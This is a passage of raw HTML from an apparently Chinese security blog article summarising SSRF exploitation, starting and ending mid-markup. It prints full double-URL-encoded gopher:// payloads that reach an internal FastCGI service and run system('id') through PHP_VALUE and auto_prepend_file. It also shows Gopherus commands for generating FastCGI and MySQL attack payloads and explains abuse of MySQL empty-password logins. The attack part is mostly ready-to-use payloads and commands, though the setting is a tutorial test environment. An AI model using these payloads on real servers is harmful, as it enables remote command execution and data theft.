class="code-snippet__number">%2501</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2508</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2514</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%250</span>F<span class="code-snippet__number">%2510</span>SERVER_SOFTWAREgo<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2520</span>fcgiclient<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%250</span>B<span class="code-snippet__number">%2509</span>REMOTE_ADDR127.0.0.1<span class="code-snippet__number">%250</span>F<span class="code-snippet__number">%2508</span>SERVER_PROTOCOLHTTP<span class="code-snippet__number">%2</span>F1.1<span class="code-snippet__number">%250</span>E<span class="code-snippet__number">%2502</span>CONTENT_LENGTH56<span class="code-snippet__number">%250</span>E<span class="code-snippet__number">%2504</span>REQUEST_METHODPOST<span class="code-snippet__number">%2509</span><span class="code-snippet__number">%255</span>BPHP_VALUEallow_url_include<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span><span class="code-snippet__literal">On</span><span class="code-snippet__number">%250</span>Ddisable_functions<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%250</span>Dsafe_mode<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span><span class="code-snippet__literal">Off</span><span class="code-snippet__number">%250</span>Dauto_prepend_file<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span>php<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2</span>Finput<span class="code-snippet__number">%250</span>F<span class="code-snippet__number">%2517</span>SCRIPT_FILENAME<span class="code-snippet__number">%2</span>Fvar<span class="code-snippet__number">%2</span>Fwww<span class="code-snippet__number">%2</span>Fhtml<span class="code-snippet__number">%2</span>Findex.php<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%2501</span>DOCUMENT_ROOT<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2505</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%25008</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%253</span>C<span class="code-snippet__number">%253</span>Fphp<span class="code-snippet__number">%2520</span>system<span class="code-snippet__number">%2528</span><span class="code-snippet__number">%2527</span>id<span class="code-snippet__number">%2527</span><span class="code-snippet__number">%2529</span><span class="code-snippet__number">%253</span>Bdie<span class="code-snippet__number">%2528</span><span class="code-snippet__number">%2527</span>-----0vcdb34oju09b8fd-----<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%2527</span><span class="code-snippet__number">%2529</span><span class="code-snippet__number">%253</span>B<span class="code-snippet__number">%253</span>F<span class="code-snippet__number">%253</span>E</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如下图所示，命令执行成功：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.2954168967421314" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/47_sCicjVq0JkINNHgaGl4Bgg50SnMmNg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5giczhqLIHesIWOKBnGT1OaJ6GVFsCicjVq0JkINNHgaGl4Bgg50SnMmNg/640?wx_fmt=png'" data-type="png" data-w="1811" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">使用Gopherus工具攻击</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">下载地址：https://github.com/tarunkant/Gopherus</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">使用Gopherus工具生成攻击FastCGI的payload：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">python gopherus.py --exploit fastcgi</span></code><code><span class="code-snippet_outer">/<span class="code-snippet__keyword">var</span>/www/html/index.php    <span class="code-snippet__meta"># 这里输入的是一个已知存在的php文件</span></span></code><code><span class="code-snippet_outer">id    <span class="code-snippet__meta"># 输入一个你要执行的命令</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.4470954356846473" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/48_MeoNN7kHI8G6R0kDF1p54T83WUUoSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gKwxqB3oA0V5sNwh7TvkGZl8RMeoNN7kHI8G6R0kDF1p54T83WUUoSQ/640?wx_fmt=png'" data-type="png" data-w="964" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url=后面打过去过去：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">ssrf</span>.php?url=gopher<span class="code-snippet__number">%3</span>A//127.0.0.1<span class="code-snippet__number">%3</span>A9000/_<span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2508</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%250</span>F<span class="code-snippet__number">%2510</span>SERVER_SOFTWAREgo<span class="code-snippet__number">%2520</span>/<span class="code-snippet__number">%2520</span>fcgiclient<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%250</span>B<span class="code-snippet__number">%2509</span>REMOTE_ADDR127.0.0.1<span class="code-snippet__number">%250</span>F<span class="code-snippet__number">%2508</span>SERVER_PROTOCOLHTTP/1.1<span class="code-snippet__number">%250</span>E<span class="code-snippet__number">%2502</span>CONTENT_LENGTH54<span class="code-snippet__number">%250</span>E<span class="code-snippet__number">%2504</span>REQUEST_METHODPOST<span class="code-snippet__number">%2509</span>KPHP_VALUEallow_url_include<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span><span class="code-snippet__literal">On</span><span class="code-snippet__number">%250</span>Adisable_functions<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%250</span>Aauto_prepend_file<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%2520</span>php<span class="code-snippet__number">%253</span>A//input<span class="code-snippet__number">%250</span>F<span class="code-snippet__number">%2517</span>SCRIPT_FILENAME/var/www/html/index.php<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%2501</span>DOCUMENT_ROOT/<span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%2505</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2501</span><span class="code-snippet__number">%25006</span><span class="code-snippet__number">%2504</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%253</span>C<span class="code-snippet__number">%253</span>Fphp<span class="code-snippet__number">%2520</span>system<span class="code-snippet__number">%2528</span><span class="code-snippet__number">%2527</span>id<span class="code-snippet__number">%2527</span><span class="code-snippet__number">%2529</span><span class="code-snippet__number">%253</span>Bdie<span class="code-snippet__number">%2528</span><span class="code-snippet__number">%2527</span>-----Made-by-SpyD3r-----<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%2527</span><span class="code-snippet__number">%2529</span><span class="code-snippet__number">%253</span>B<span class="code-snippet__number">%253</span>F<span class="code-snippet__number">%253</span>E<span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span><span class="code-snippet__number">%2500</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.334375" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/49_LWdZtibf4eYrSHibG7eM1BBbxJ4FFw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5ghBvAIyFnyv73IqoCbsJQ6SRMMVLWdZtibf4eYrSHibG7eM1BBbxJ4FFw/640?wx_fmt=png'" data-type="png" data-w="1600" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">命令执行成功。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">攻击内网MySql</h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.517578125" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/50_sHrWPBXHrSECTrFvVbbXUSgyQwgYuA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gkMtMibgY2obDRWP5oVTj0BFujsHrWPBXHrSECTrFvVbbXUSgyQwgYuA/640?wx_fmt=png'" data-type="png" data-w="1024" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战/应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试环境如下：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.6414073071718539" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/51_Lia5cVHQic45ibreRxYYiaEPMc2n4g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gs0tBqCIAGhR0su6sMomJO9icHCibNELia5cVHQic45ibreRxYYiaEPMc2n4g/640?wx_fmt=png'" data-type="png" data-w="739" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">Ubuntu服务器为WEB服务器，存在SSRF漏洞，且上面运行着MySql服务，用户名为whoami，密码为空并允许空密码登录。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">下面我们还是使用Gopherus工具生成攻击Ubuntu服务器本地MySql的payload：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">python gopherus.py <span class="code-snippet__comment">--exploit mysql</span></span></code><code><span class="code-snippet_outer">whoami    <span class="code-snippet__comment"># 登录用的用户名</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">show</span> <span class="code-snippet__keyword">databases</span>;    <span class="code-snippet__comment"># 登录后要执行的sql语句</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成如下payload：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.22846638655462184" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/52_VoeCtj4Yuo5QgdIWbcHwVGMqIzrMlQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gFJEQoRBokwEo9jInB7ZFW5IIVoeCtj4Yuo5QgdIWbcHwVGMqIzrMlQ/640?wx_fmt=png'" data-type="png" data-w="1904" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">将得到的paylaod进行url二次编码，然后将最终的payload内容放到?url=后面发送打过去就行了。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">Ending......</h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.6541291905151267" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/53_e0tzLibSELCib0YeCelibPHhYWC7tw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gOReBpiaBqDN0VfZHsY352dKjdgB4e0tzLibSELCib0YeCelibPHhYWC7tw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1223" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。</p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">参考：https://blog.csdn.net/Ping_Pig/article/details/99412487</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://www.cnblogs.com/iors/p/9777571.html</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://blog.csdn.net/qq43625917/article/details/104528645?utmsource=app</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://xz.aliyun.com/t/2115</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://blog.csdn.net/weixin_36343353/article/details/112277580</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://blog.csdn.net/cj_Allen/article/details/106855893</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://bbs.ichunqiu.com/thread-58455-1-1.html</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://blog.chaitin.cn/gopher-attack-surfaces/</p><p style="margin-top: 15px;margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://www.anquanke.com/post/id/197431#h2-6</p><p style="margin-top: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">https://www.anquanke.com/post/id/145519#h2-14</p></blockquote><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; white-space: normal; font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; color: rgb(163, 163, 163) !important;" class="js_darkmode__979" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;color: rgb(163, 163, 163) !important;"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/54_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"  /><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; white-space: normal; font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__980" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: center;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; white-space: normal; font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__981" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-style="color: 